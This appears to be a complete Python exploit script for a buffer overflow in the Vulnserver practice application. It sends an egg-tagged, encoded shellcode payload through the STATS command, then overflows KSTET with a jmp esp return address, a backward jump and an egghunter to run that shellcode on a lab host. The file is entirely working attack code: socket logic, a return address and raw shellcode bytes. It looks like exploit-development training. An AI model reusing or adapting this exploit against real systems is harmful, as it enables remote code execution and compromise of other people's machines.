#!/usr/bin/python3

import socket

host = "192.168.56.102"
port = 9999

egg = b"FSOCFSOC"
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x46\x53\x4f\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

shellcode = b""
shellcode += b"\xbb\x06\x9d\xf7\x69\xda\xd5\xd9\x74\x24\xf4\x5d\x29"
shellcode += b"\xc9\xb1\x52\x83\xc5\x04\x31\x5d\x0e\x03\x5b\x93\x15"
shellcode += b"\x9c\x9f\x43\x5b\x5f\x5f\x94\x3c\xe9\xba\xa5\x7c\x8d"
shellcode += b"\xcf\x96\x4c\xc5\x9d\x1a\x26\x8b\x35\xa8\x4a\x04\x3a"
shellcode += b"\x19\xe0\x72\x75\x9a\x59\x46\x14\x18\xa0\x9b\xf6\x21"
shellcode += b"\x6b\xee\xf7\x66\x96\x03\xa5\x3f\xdc\xb6\x59\x4b\xa8"
shellcode += b"\x0a\xd2\x07\x3c\x0b\x07\xdf\x3f\x3a\x96\x6b\x66\x9c"
shellcode += b"\x19\xbf\x12\x95\x01\xdc\x1f\x6f\xba\x16\xeb\x6e\x6a"
shellcode += b"\x67\x14\xdc\x53\x47\xe7\x1c\x94\x60\x18\x6b\xec\x92"
shellcode += b"\xa5\x6c\x2b\xe8\x71\xf8\xaf\x4a\xf1\x5a\x0b\x6a\xd6"
shellcode += b"\x3d\xd8\x60\x93\x4a\x86\x64\x22\x9e\xbd\x91\xaf\x21"
shellcode += b"\x11\x10\xeb\x05\xb5\x78\xaf\x24\xec\x24\x1e\x58\xee"
shellcode += b"\x86\xff\xfc\x65\x2a\xeb\x8c\x24\x23\xd8\xbc\xd6\xb3"
shellcode += b"\x76\xb6\xa5\x81\xd9\x6c\x21\xaa\x92\xaa\xb6\xcd\x88"
shellcode += b"\x0b\x28\x30\x33\x6c\x61\xf7\x67\x3c\x19\xde\x07\xd7"
shellcode += b"\xd9\xdf\xdd\x78\x89\x4f\x8e\x38\x79\x30\x7e\xd1\x93"
shellcode += b"\xbf\xa1\xc1\x9c\x15\xca\x68\x67\xfe\x35\xc4\x5f\x9b"
shellcode += b"\xdd\x17\x9f\x40\x37\x91\x79\xec\x57\xf7\xd2\x99\xce"
shellcode += b"\x52\xa8\x38\x0e\x49\xd5\x7b\x84\x7e\x2a\x35\x6d\x0a"
shellcode += b"\x38\xa2\x9d\x41\x62\x65\xa1\x7f\x0a\xe9\x30\xe4\xca"
shellcode += b"\x64\x29\xb3\x9d\x21\x9f\xca\x4b\xdc\x86\x64\x69\x1d"
shellcode += b"\x5e\x4e\x29\xfa\xa3\x51\xb0\x8f\x98\x75\xa2\x49\x20"
shellcode += b"\x32\x96\x05\x77\xec\x40\xe0\x21\x5e\x3a\xba\x9e\x08"
shellcode += b"\xaa\x3b\xed\x8a\xac\x43\x38\x7d\x50\xf5\x95\x38\x6f"
shellcode += b"\x3a\x72\xcd\x08\x26\xe2\x32\xc3\xe2\x02\xd1\xc1\x1e"
shellcode += b"\xab\x4c\x80\xa2\xb6\x6e\x7f\xe0\xce\xec\x75\x99\x34"
shellcode += b"\xec\xfc\x9c\x71\xaa\xed\xec\xea\x5f\x11\x42\x0a\x4a"

buffer = b"\x90" * 8
buffer += egghunter
buffer += b"\x90" * (65 - len(buffer))
buffer += b"\xAF\x11\x50\x62"           # jmp esp in essfunc.dll
buffer += b"\xEB\xC1"                   # jmp 63 bytes backwards
buffer += b"C" * (700 - len(buffer))

#### send the egg and shellcode for egghunter to execute ####

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

banner = s.recv(1024)
print(banner.decode())

exploit = "STATS /.:/ ".encode() + bytearray(egg) + bytearray(shellcode) + "\r\n".encode()

s.send(exploit)

#### send buffer to overwrite EIP and send egghunter ####

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))

banner = s.recv(1024)
print(banner.decode())

exploit = "KSTET /.:/ ".encode() + bytearray(buffer) + "/r/n".encode()

s.send(exploit)